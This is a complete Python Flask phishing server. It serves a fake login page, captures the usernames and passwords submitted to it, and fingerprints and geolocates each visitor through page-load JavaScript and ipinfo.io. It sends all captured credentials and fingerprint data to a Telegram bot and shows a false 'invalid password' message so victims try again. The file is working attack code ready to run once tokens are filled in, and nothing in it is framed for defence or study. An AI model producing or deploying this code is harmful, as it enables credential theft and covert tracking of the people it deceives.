#!/usr/bin/env python3
from flask import Flask, request, redirect
import datetime
import os
import json
import requests

app = Flask(__name__)
os.makedirs("phishing", exist_ok=True)
LOG_FILE = "phishing/visitors.log"

# === Telegram Bot Setup ===
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN" # Replace with your actual bot token
CHAT_ID = "YOUR_CHAT_ID" # Replace with your actual chat ID

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"[!] Telegram error: {e}")

# === HTML Page ===
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; }
    h1 { text-align: center; color: #444; }
    form { width: 300px; margin: 0 auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    form input { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; }
    form input:focus { border-color: #007bff; outline: none; }
    form button { width: 100%; padding: 10px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
    form button:hover { background-color: #218838; }
  </style>
</head>
<body>
  <h1>Welcome</h1>
  <form action="/log" method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>

  <script>
    const fp = {
      screen: window.screen.width + "x" + window.screen.height,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      userAgent: navigator.userAgent
    };

   // Add your token below
  const token = "YOUR_IPINFO_TOKEN";
  fetch(`https://ipinfo.io/json?token=${token}`)
      .then(res => res.json())
      .then(loc => {
        const data = Object.assign({}, loc, fp);
        fetch("/log", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });
      });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return HTML_PAGE

@app.route("/log", methods=["POST"])
def log():
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")

    if request.form:  # Credentials submitted
        username = request.form.get("username")
        password = request.form.get("password")
        creds = f"[{now}] [CREDENTIALS] IP: {ip}, User-Agent: {ua}, Username: {username}, Password: {password}\n"
        print(creds.strip())
        with open(LOG_FILE, "a") as f:
            f.write(creds)
        send_to_telegram(creds)
        return '''
            <h3 style="text-align:center; color:red;">Invalid username or password.</h3>
            <script>setTimeout(() => { window.location.href = "/" }, 2000);</script>
        '''
    else:  # JSON fingerprinting data
        try:
            data = request.get_json(force=True)
            entry = f"[{now}] [FINGERPRINT] IP: {ip}, User-Agent: {ua}, Data: {json.dumps(data)}\n"
            print(entry.strip())
            with open(LOG_FILE, "a") as f:
                f.write(entry)
            send_to_telegram(entry)
            return "Fingerprint data received", 200
        except Exception as e:
            print(f"[!] Error logging JSON: {e}")
            return "Error", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
